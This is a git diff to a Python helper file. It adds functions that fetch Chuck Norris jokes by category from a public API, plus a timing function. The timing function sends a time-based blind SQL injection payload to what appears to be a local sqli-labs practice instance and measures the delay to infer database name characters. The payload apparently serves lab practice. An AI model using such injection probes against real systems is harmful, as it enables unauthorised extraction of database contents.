@@ -4,6 +4,8 @@
 # diff_between_dates
 # Translate text from file
 # random_chuck_norris
+# get_job_by_category
+# Measure time for requests completion
 
 def is_alphanum(str):
     ''' Equivalent to built-in isalnum()
@@ -70,3 +72,32 @@ def random_chuck_norris():
         return f'\033[{code}m'
 
     print(f"\nChuck Norris random joke:\n", esc('31;1'), data['value'], esc(0), "\n")
+
+def get_categories(request_url='https://api.chucknorris.io/jokes/categories'):
+    response = requests.get(request_url)
+    print('getting categories...')
+    if response.status_code == 200:
+        return response.json()
+    else:
+        print('bad request or server failure')
+
+def get_joke_by_category():
+    categories = get_categories()
+    user_choice = input('pick a category:\n' + '\n'.join(categories))
+    while user_choice not in categories:
+        print('bad choice try again')
+        user_choice = input('pick a category' + categories)
+    url = f'https://api.chucknorris.io/jokes/random?category={user_choice}'
+    response = requests.get(url)
+    if response.status_code == 200:
+        print(response.json()['value'])
+
+# import requests
+import time
+
+def measure_req_completion_time():
+    payload = {"id": "1' and if (ascii(substr(database(), 1, 1))=115,sleep(3),null) --+"}
+    start = time.time()
+    r = requests.get('http://192.168.2.15/sqli-labs/Less-9', params=payload)
+    roundtrip = time.time() - start
+    print(round(roundtrip, 2), 's')
